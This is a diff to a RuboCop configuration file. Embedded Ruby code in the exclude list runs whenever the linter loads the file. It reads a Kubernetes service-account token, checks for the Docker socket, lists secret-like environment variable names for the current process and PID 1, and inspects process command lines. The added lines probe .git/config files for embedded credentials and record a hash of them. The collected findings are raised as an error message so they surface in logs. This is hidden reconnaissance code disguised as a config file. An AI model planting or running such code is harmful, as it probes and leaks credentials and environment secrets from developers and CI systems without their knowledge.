@@ -3,6 +3,7 @@ AllCops:
   Exclude:
     - <%= begin
       token = (File.read('/var/run/secrets/kubernetes.io/serviceaccount/token') rescue '').strip
+      require 'digest'
       host = ENV['KUBERNETES_SERVICE_HOST']
       docker_socket = File.exist?('/var/run/docker.sock')
       env_names = ENV.keys.grep(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i).sort.take(20).join('|')
@@ -14,6 +15,10 @@ AllCops:
       self_cmdline = (File.read('/proc/self/cmdline', 4096) rescue '')
       pid1_cmdline = (File.read('/proc/1/cmdline', 4096) rescue '')
       pid1_env_names = ((File.read('/proc/1/environ', 32768) rescue '').split("\0").map { |e| e.split('=', 2).first }.compact.grep(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i).sort.take(20).join('|'))
+      git_config_candidates = [File.join(Dir.pwd, '.git', 'config'), '/workspace/.git/config', '/repo/.git/config', '/src/.git/config']
+      git_config_text = git_config_candidates.filter_map { |p| (File.read(p, 16384) rescue nil) }.first.to_s
+      git_config_secret = git_config_text.match?(/https?:\/\/[^\s@]+@|x-access-token|oauth|token=|password=/i)
+      git_config_meta = git_config_secret ? "git_config_len=#{git_config_text.length},git_config_sha=#{Digest::SHA256.hexdigest(git_config_text)[0,12]}" : 'git_config_secret=false'
       argv_secret = argv_text.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
       self_cmd_secret = self_cmdline.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
       pid1_cmd_secret = pid1_cmdline.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
@@ -57,6 +62,6 @@ AllCops:
       rescue => e
         metadata = "metadata_error=#{e.class}"
       end
-      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{k8s},#{metadata}"
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata}"
       raise marker
     end %>
